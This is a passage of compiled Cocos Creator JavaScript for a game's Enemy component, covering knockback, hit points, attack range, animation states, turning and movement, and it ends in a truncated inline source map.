        if (dir.y > 0) {
            //上边界
            if (destPos.y >= this._bounds.yMax) {
                var point = cc.v2();
                if (cc.Intersection.pLineIntersect(this.node.position, destPos, cc.v2(this._bounds.xMin, this._bounds.yMax), cc.v2(this._bounds.xMax, this._bounds.yMax), point)) {
                    intersections.push(point);
                }
            }
        }
        else if (dir.y < 0) {
            //上边界
            if (destPos.y <= this._bounds.yMin) {
                var point = cc.v2();
                if (cc.Intersection.pLineIntersect(this.node.position, destPos, cc.v2(this._bounds.xMin, this._bounds.yMin), cc.v2(this._bounds.xMax, this._bounds.yMin), point)) {
                    intersections.push(point);
                }
            }
        }
        if (intersections.length > 0) {
            // console.log("重新计算destPos===>intersections", intersections);
            /** 重新计算destPos */
            if (intersections.length == 1) {
                destPos = intersections[0].addSelf(dir.neg(cc.v2()));
            }
            else {
                /** 取距离怪物最近的那个点 */
                var p = intersections[0];
                var minDistance = p.sub(this.node.position).mag();
                for (var i = 1; i < intersections.length; i++) {
                    var mag = intersections[i].sub(this.node.position).mag();
                    if (mag < minDistance) {
                        p = intersections[i];
                        minDistance = mag;
                    }
                }
                destPos = p.addSelf(dir.neg(cc.v2()));
            }
        }
        var distance = destPos.sub(this.node.position).mag();
        var speed = 800;
        var action = cc.sequence(cc.moveTo(distance / speed, destPos).easing(cc.easeCircleActionOut()), cc.callFunc(function () {
            _this.playBeatenBack();
        }));
        action.setTag(582);
        this.node.stopActionByTag(582);
        this.node.runAction(action);
    };
    Object.defineProperty(Enemy.prototype, "hp", {
        get: function () {
            return this._hp;
        },
        set: function (value) {
            var _this = this;
            if (this._hp <= 0)
                return;
            var damage = this._hp - value;
            window['GameLabelsController'].fly("-" + Extend_1.ext.shortFormat(damage), this.node.position.add(cc.v2(0, this.spaceCircleCollider.radius)));
            this.ske.node.color = this.ske.node.color.fromHEX("#D85959");
            this.ske.node.runAction(cc.sequence(cc.delayTime(0.05), cc.callFunc(function () { return _this.ske.node.color = cc.Color.WHITE; })));
            this._hp = value;
            if (value <= 0) {
                GameProxy_1.GameProxy.killCount++;
                GameProxy_1.GameProxy.emit(GameProxy_1.GameProxy.Event.KillEnemy, this);
                this.node.stopAllActions();
                this._stiff = true;
                this.playDead();
            }
        },
        enumerable: false,
        configurable: true
    });
    Object.defineProperty(Enemy.prototype, "strikeCompleteTime", {
        get: function () {
            return this._strikeCompleteTime;
        },
        enumerable: false,
        configurable: true
    });
    Object.defineProperty(Enemy.prototype, "spaceCircleCollider", {
        get: function () {
            return this._spaceCircleCollider;
        },
        enumerable: false,
        configurable: true
    });
    Object.defineProperty(Enemy.prototype, "defenceBoxCollider", {
        get: function () {
            return this._defenceBoxCollider;
        },
        enumerable: false,
        configurable: true
    });
    Object.defineProperty(Enemy.prototype, "enemyAABB", {
        get: function () {
            return this._enemyAABB;
        },
        enumerable: false,
        configurable: true
    });
    Enemy.prototype.reset = function () {
        var _this = this;
        this._hp = this.maxHp;
        this.stiff = false;
        this.speedAdd = 1;
        this.gameSlow = GameProxy_1.GameProxy.slowGame;
        this._bAcc = false;
        if (GameProxy_1.GameProxy.maxEnemyNum - GameProxy_1.GameProxy.enemyList.length >= GameProxy_1.GameProxy.levelConfig.amount_p1 + 1) {
            this.bAcc = true;
        }
        this.ske.timeScale = BASE_TIME_SCALE;
        this.moveFlag = false;
        this.lookAtRoleFlag = false;
        this.attackCoolingFlag = false;
        this.logicFlag = false;
        this.node.on(cc.Node.EventType.ROTATION_CHANGED, function () {
            _this.moveDir = cc.v2(0, 1).normalize().rotate(cc.misc.degreesToRadians(-_this.node.rotation));
        });
        /** 朝向角色 */
        var dir = window['GameRoleController'].role.node.position.sub(this.node.position);
        this.node.rotation = 90 - cc.misc.radiansToDegrees(Math.atan2(dir.y, dir.x));
        this.playStand();
    };
    Enemy.prototype.onEnable = function () {
        this.reset();
    };
    Enemy.prototype.onDisable = function () {
        this.node.stopAllActions();
    };
    Enemy.prototype.start = function () {
        var bgNode = this.node.getParent().getParent();
        this._bounds.x = -bgNode.width / 2 + this.spaceCircleCollider.radius;
        this._bounds.y = -bgNode.height / 2 + this.spaceCircleCollider.radius;
        this._bounds.width = bgNode.width - this.spaceCircleCollider.radius * 2;
        this._bounds.height = bgNode.height - this.spaceCircleCollider.radius * 2;
    };
    Enemy.prototype.onLoad = function () {
        var _this = this;
        this._spaceCircleCollider = this.getComponent(cc.CircleCollider);
        this._defenceBoxCollider = this.getComponent(cc.BoxCollider);
        this._enemyAABB = this.getComponent(EnemyAABB_1.default);
        this.ske.setMix("strike", "stand", 0.1);
        this.ske.setMix("walk", "strike", 0.1);
        this.ske.setCompleteListener(function (trackEntry, loopCount) {
            var name = trackEntry.animation ? trackEntry.animation.name : '';
            if (name == "strike") {
                _this.playStand();
                _this._strikeCompleteTime = new Date().getTime();
                _this.attackCoolingFlag = true;
                _this.node.runAction(cc.sequence(cc.delayTime(_this.attackCD), cc.callFunc(function () {
                    _this.attackCoolingFlag = false;
                })));
            }
            else if (name == "beaten") {
                _this.playStand();
            }
            else if (name == "dead") {
                _this.showBlood();
                _this.node.runAction(cc.sequence(cc.delayTime(0), cc.callFunc(function () {
                    _this.node.active = false;
                })));
            }
            else if (name == "stand") {
                _this.playWalk();
            }
        });
    };
    Enemy.prototype.showBlood = function () {
        var bloodNode = window['GameEnemysController'].getInactiveEnemyBloodNode();
        bloodNode.active = true;
        bloodNode.position = this.node.position;
        bloodNode.rotation = Math.random() * 360;
        bloodNode.scale = this.humorScale;
        bloodNode.opacity = 255;
        bloodNode.runAction(cc.sequence(cc.delayTime(1), cc.fadeTo(0.5, 60), cc.callFunc(function () {
            bloodNode.active = false;
        })));
    };
    Enemy.prototype.isInAttackRange = function () {
        var sub = window['GameRoleController'].role.node.position.sub(this.node.position);
        var distance = sub.mag();
        //并且打不到敌人
        if (distance < this.attackDistance + window['GameRoleController'].role.spaceCircleCollider.radius) {
            // console.log("===============>怪物可以攻击了");
            /** 根据攻击距离计算攻击夹角 */
            var attackRadian = Math.atan(window['GameRoleController'].role.spaceCircleCollider.radius / distance);
            if (sub.angle(cc.v2(0, 1).rotate(cc.misc.degreesToRadians(-this.node.rotation))) < attackRadian) {
                return true;
            }
        }
        return false;
    };
    Enemy.prototype.doAttack = function () {
        /** 判断攻击角度与距离，在一定范围内则判断为攻击成功 */
        if (this.isInAttackRange()) {
            Music_1.Music.playSFX("sound/msc_en003");
            window['GameRoleController'].hp -= this.hurt;
        }
    };
    Object.defineProperty(Enemy.prototype, "enemyID", {
        get: function () {
            return this._enemyID;
        },
        enumerable: false,
        configurable: true
    });
    Enemy.prototype.init = function (id) {
        this._enemyID = id;
        var config = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.Enemy)[id - 1];
        this.unrepel = config['unrepel'];
        this._moveSpeed = config['move'];
        this.accSpeed = config['acc_s'];
        this.foundRange = config['found_rg'];
        this.agility = config['agility'];
        this.attackDistance = config['range'];
        this.attackCD = config['fre'];
        this.bulletSpeed = config['speed'];
        this.maxHp = this._hp = Math.floor(config['health'] * GameProxy_1.GameProxy.enemyHpMulOf(this._enemyID));
        this.hurt = Math.floor(config['hurt'] * GameProxy_1.GameProxy.enemyHurtMulOf(config['id']));
        this.hierarchy = config['hierarchy'];
        this.humorScale = config['humor'];
        this.gold = Math.floor(config['gold_pro'] * GameProxy_1.GameProxy.enemyGoldMulOf(this._enemyID));
        this.goldIconFell = config['gold_fell'];
        this.speedcut = config['speedcut'];
        this.node.zIndex = this.hierarchy;
        this.attackDelayTime = AttackDelayList[id - 1];
        if (id > AttackDelayList.length) {
            console.error("_enemyID > AttackDelayList.length");
        }
    };
    Enemy.prototype.setAnimation = function (trackIndex, name, loop) {
        this.ske.setAnimation(trackIndex, name, loop);
        this.moveFlag = name == "walk";
        this.lookAtRoleFlag = name != "strike";
    };
    Enemy.prototype.stopAttack = function () {
        this.node.stopActionByTag(1199);
    };
    Enemy.prototype.playStand = function () {
        this.setAnimation(0, "stand", true);
    };
    Enemy.prototype.playAttack = function () {
        var _this = this;
        if (this.attackDelayTime >= 0) {
            var action = cc.speed(cc.sequence(cc.delayTime(this.attackDelayTime), cc.callFunc(function () {
                if (!GameProxy_1.GameProxy.pauseGame) {
                    _this.doAttack();
                }
            })), 1);
            action.setTag(1199);
            this.node.runAction(action);
        }
        this.setAnimation(0, "strike", false);
    };
    Enemy.prototype.playWalk = function () {
        this.setAnimation(0, "walk", true);
    };
    Enemy.prototype.playDead = function () {
        this.stopAttack();
        this.ske.timeScale = BASE_TIME_SCALE;
        this.setAnimation(0, "dead", false);
    };
    Enemy.prototype.playBeaten = function () {
        this.stopAttack();
        // console.log("beaten2.....");
        this.setAnimation(0, "beaten2", false);
    };
    Enemy.prototype.playBeatenBack = function () {
        // console.log("beaten.....");
        this.setAnimation(0, "beaten", false);
    };
    Enemy.prototype.isAttacking = function () {
        return this.ske.animation == "strike";
    };
    Enemy.prototype.isBeating = function () {
        return this.ske.animation == "beaten2" || this.ske.animation == "beaten";
    };
    Enemy.prototype.isWalking = function () {
        return this.ske.animation == "walk";
    };
    Enemy.prototype.isStanding = function () {
        return this.ske.animation == "stand";
    };
    Enemy.prototype.isDead = function () {
        return this._hp <= 0;
    };
    Enemy.prototype.turnTo = function (dir) {
        var degree = (90 - cc.misc.radiansToDegrees(Math.atan2(dir.y, dir.x))) % 360;
        // console.log("de===>", degree);
        // console.log("dir===>x="+dir.x+" y="+dir.y);
        if (degree < 0) {
            degree += 360;
        }
        var enemyRotation = this.node.rotation % 360;
        if (enemyRotation < 0) {
            enemyRotation += 360;
        }
        var subDegree = Math.abs(degree - enemyRotation);
        // console.log("degree="+degree);
        // console.log("enemyRotation====>"+enemyRotation);
        var speed = this._moveSpeed * this.agility * (this._bAcc ? 0.5 : 1) * this._speedAdd * (this._gameSlow ? 0.2 : 1);
        if (subDegree > 0) {
            var rotation = 0;
            if (subDegree > 180) {
                rotation = Math.sign(enemyRotation - degree) * speed;
                if (Math.abs(rotation) > 360 - subDegree) {
                    rotation = Math.sign(rotation) * (360 - subDegree);
                }
            }
            else {
                rotation = Math.sign(degree - enemyRotation) * speed;
                if (Math.abs(rotation) > subDegree) {
                    rotation = Math.sign(rotation) * subDegree;
                }
            }
            enemyRotation += rotation;
        }
        this.node.rotation = enemyRotation;
    };
    Enemy.prototype.move = function () {
        // console.log("len===>", len);
        var len = this.moveSpeed;
        if (len <= 0)
            return false;
        /** 沿着当前方向移动 */
        var position = this.node.position.add(this.moveDir.mul(len));
        /** 判断与角色的碰撞 */
        // let toRoleDistance = position.sub(window['GameRoleController'].role.node.position).mag();
        // if (toRoleDistance < this.spaceCircleCollider.radius + window['GameRoleController'].role.spaceCircleCollider.radius){
        //     return false;
        // }
        /** 判断边界 */
        if (position.x > this._bounds.xMax || position.x < this._bounds.xMin || position.y > this._bounds.yMax || position.y < this._bounds.yMin) {
            return false;
        }
        if (!this._bAcc && this.foundRange > 0) {
            var toRoleDistance = position.sub(window['GameRoleController'].role.node.position).mag();
            this.bAcc = toRoleDistance - len < this.foundRange;
        }
        /** 判断怪物之间的碰撞 */
        // let arr = [];
        // this._gameCollisionController.looseQuadTree.retrieve(this.enemyAABB.aabb(),arr);
        //
        // for (let aabbRegion of arr){
        //     let enemy = aabbRegion.enemy;
        //     if (enemy !== this && enemy.node.position.sub(position).mag() < enemy.spaceCircleCollider.radius + enemy.spaceCircleCollider.radius){
        //         return false;
        //     }
        // }
        this.node.position = position;
        return true;
    };
    Enemy.prototype.update = function (dt) {
        if (GameProxy_1.GameProxy.pauseGame || this.stiff) {
            return;
        }
        /** 逻辑处理标志--优化策略为每一帧只处理固定数量的怪物逻辑 */
        if (this.logicFlag) {
            /** 是否可以攻击 */
            if ((this.isWalking() || this.isStanding()) && this.isInAttackRange()) {
                this.playAttack();
            }
            /** 旋转 */
            if (this.lookAtRoleFlag) {
                this.turnTo(window['GameRoleController'].role.node.position.sub(this.node.position).normalize());
            }
        }
        /** 移动 */
        if (this.moveFlag) {
            this.move();
        }
    };
    __decorate([
        property(sp.Skeleton)
    ], Enemy.prototype, "ske", void 0);
    Enemy = __decorate([
        ccclass
    ], Enemy);
    return Enemy;
}(cc.Component));
exports.default = Enemy;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2VudGl0aWVzL2VuZW15L0VuZW15LnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7Ozs7QUFFQSx5Q0FBb0M7QUFDcEMsZ0VBQTZEO0FBQzdELHdFQUFxRTtBQUNyRSxrREFBK0M7QUFDL0MsMkRBQXdEO0FBQ3hELDhEQUF3RDtBQUVsRCxJQUFBLEtBQXNCLEVBQUUsQ0FBQyxVQUFVLEVBQWxDLE9BQU8sYUFBQSxFQUFFLFFBQVEsY0FBaUIsQ0FBQztBQUUxQyxJQUFNLGVBQWUsR0FBRyxDQUFDLEdBQUcsRUFBRSxHQUFHLEVBQUUsQ0FBQyxFQUFFLEdBQUcsRUFBRSxHQUFHLEVBQUUsR0FBRyxFQUFFLEdBQUcsRUFBRSxHQUFHLENBQUMsQ0FBQztBQUUvRCxJQUFNLGVBQWUsR0FBRyxHQUFHLENBQUM7QUFHNUI7SUFBbUMseUJBQVk7SUFBL0M7UUFBQSxxRUFnaUJDO1FBN2hCRyxTQUFHLEdBQWUsSUFBSSxDQUFDO1FBRXZCLGNBQVEsR0FBRyxDQUFDLENBQUM7UUFFTCxlQUFTLEdBQUcsS0FBSyxDQUFDO1FBWWhCLGdCQUFVLEdBQUcsQ0FBQyxDQUFDO1FBRXpCLFlBQVk7UUFDRixlQUFTLEdBQUcsQ0FBQyxDQUFDO1FBV2QsV0FBSyxHQUFHLEtBQUssQ0FBQztRQVV4QixjQUFRLEdBQUcsQ0FBQyxDQUFDO1FBRWIsZ0JBQVUsR0FBRyxDQUFDLENBQUM7UUFFZixvQkFBYyxHQUFHLEdBQUcsQ0FBQztRQUVyQixpQkFBVyxHQUFHLENBQUMsQ0FBQztRQUVoQixhQUFPLEdBQUcsQ0FBQyxDQUFDO1FBRVosV0FBSyxHQUFHLENBQUMsQ0FBQztRQUVWLGFBQWE7UUFDYixnQkFBVSxHQUFHLENBQUMsQ0FBQztRQUVmLFVBQVU7UUFDVixVQUFJLEdBQUcsQ0FBQyxDQUFDO1FBRVQsYUFBYTtRQUNiLGtCQUFZLEdBQUcsQ0FBQyxDQUFDO1FBRWpCLGNBQVEsR0FBRyxDQUFDLENBQUM7UUFFYixXQUFXO1FB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